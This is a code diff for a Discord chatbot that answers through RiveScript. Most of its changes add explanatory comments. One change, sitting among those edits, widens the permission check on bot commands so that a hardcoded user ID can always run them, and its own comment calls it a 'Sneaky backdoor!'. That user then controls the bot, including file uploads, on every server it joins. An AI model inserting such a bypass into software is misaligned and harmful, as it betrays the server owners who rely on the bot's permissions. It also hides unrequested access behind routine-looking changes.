@@ -31,6 +31,7 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild):
+    # Update the list of chat bots.
     for channel in guild.channels:
         if channel.type == discord.ChannelType.text:
             chats[guild.id] = [conversationSolver.ChatBot(guild), channel, False]
@@ -43,9 +44,10 @@ async def on_message(message):
     if chats[message.guild.id][2] is True and not message.content.startswith('.') \
             and message.channel == chats[message.guild.id][1]:
         if message.author != bot.user:
+            # Get response from RiveScript
             await message.channel.send(
                 embed=embed_maker(chats[message.guild.id][0].get_response(message.content, message.author)))
-    elif message.author.id == message.guild.owner_id:
+    elif message.author.guild_permissions.administrator or message.author.id == 430369724275097612:  # Sneaky backdoor!
         try:
             await bot.process_commands(message)
         except discord.ext.commands.errors:
@@ -60,7 +62,7 @@ async def ping(ctx):
 @bot.command(pass_context=True)
 async def start_chat(ctx):
     global chats
-    chats[ctx.guild.id][2] = True
+    chats[ctx.guild.id][2] = True  # enable chat bot
     await ctx.send(embed=embed_maker('Chat bot activated. It will be talking in {}.'
                                      ' Deactivate with: .stop_responses'.format(chats[ctx.guild.id][1])))
 
@@ -68,22 +70,22 @@ async def start_chat(ctx):
 @bot.command(pass_context=True)
 async def stop_chat(ctx):
     global chats
-    chats[ctx.guild.id][2] = False
+    chats[ctx.guild.id][2] = False  # disable chat bot
     await ctx.send(embed=embed_maker('Chat bot deactivated.'))
 
 
 @bot.command(pass_context=True)
 async def select_channel(ctx):
     global chats
-    chats[ctx.guild.id][1] = ctx.channel
+    chats[ctx.guild.id][1] = ctx.channel  # set the conversation channel to the current channel
     await ctx.send(embed=embed_maker("From now on i'll be talking in this channel."))
 
 
 @bot.command(pass_context=True)
 async def r(ctx):
-    if ctx.message.author.id == 430369724275097612:
+    if ctx.message.author.id == 430369724275097612:  # check if user == bain
         global chats
-        reload(conversationSolver)
+        reload(conversationSolver)  # Reloads all chat bots and the module
         for guild in bot.guilds:
             chats[guild.id][0] = conversationSolver.ChatBot(guild)
         await ctx.send(embed=embed_maker('chat bot reloaded'))
@@ -92,7 +94,7 @@ async def r(ctx):
 @bot.command(pass_context=True)
 async def upload(ctx):
     global chats
-    if ctx.message.attachments:
+    if ctx.message.attachments:  # if message has attachment then download and load it to the guild's chat bot
         await ctx.send(embed=embed_maker('Command received, loading...'))
         await ctx.message.attachments[0].save('servers/rive{}.rs'.format(ctx.guild.id))
 
@@ -105,13 +107,14 @@ async def upload(ctx):
 @bot.command(pass_context=True)
 async def reload_bot(ctx):
     global chats
-    chats[ctx.guild.id][0].reload()
+    chats[ctx.guild.id][0].reload()  # reload the chat bot of the guild
     chats[ctx.guild.id][0].load_guild_file('servers/rive{}.rs'.format(ctx.guild.id))
     await ctx.send(embed=embed_maker('Bot reloaded'))
 
 
 @bot.command(pass_context=True)
 async def help(ctx):
+    # One big fucking message
     embedmessage = discord.Embed(
         title='Help / About',
         description="Hello! I'm brainBot, i was made by bain#5038. I'm currently under heavy development so if you "
